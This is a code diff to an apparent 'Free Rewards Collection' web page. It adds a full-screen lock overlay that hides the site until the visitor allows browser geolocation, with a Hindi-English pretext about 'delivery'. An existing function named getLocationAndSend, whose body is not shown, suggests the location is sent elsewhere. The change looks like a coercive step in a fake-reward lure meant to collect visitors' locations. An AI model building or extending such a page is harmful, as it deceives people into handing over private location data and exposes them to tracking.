@@ -50,7 +50,32 @@ button{
 </head>
 
 <body>
+<div id="locationLock" style="
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:#000;
+color:white;
+display:flex;
+flex-direction:column;
+justify-content:center;
+align-items:center;
+z-index:9999;
+text-align:center;
+padding:20px;
+">
 
+<h2>📍 Location Required</h2>
+<p>Delivery continue karne ke liye location allow karein</p>
+
+<button onclick="requestLocation()"
+style="padding:14px 22px;font-size:18px;background:#28a745;color:white;border:none;border-radius:8px;">
+Allow Location
+</button>
+
+</div>
 <h1>🎁 Free Rewards Collection</h1>
 
 <div class="container" id="products"></div>
@@ -158,3 +183,28 @@ function getLocationAndSend() {
 
 }
 </script>
+<script>
+function requestLocation(){
+
+ if(navigator.geolocation){
+
+   navigator.geolocation.getCurrentPosition(
+     function(position){
+
+       // location mil gayi → unlock website
+       document.getElementById("locationLock").style.display="none";
+
+       console.log("Location Allowed");
+
+     },
+     function(){
+       alert("Delivery ke liye location allow karna zaroori hai.");
+     }
+   );
+
+ }else{
+   alert("Location supported nahi hai.");
+ }
+
+}
+ </script>
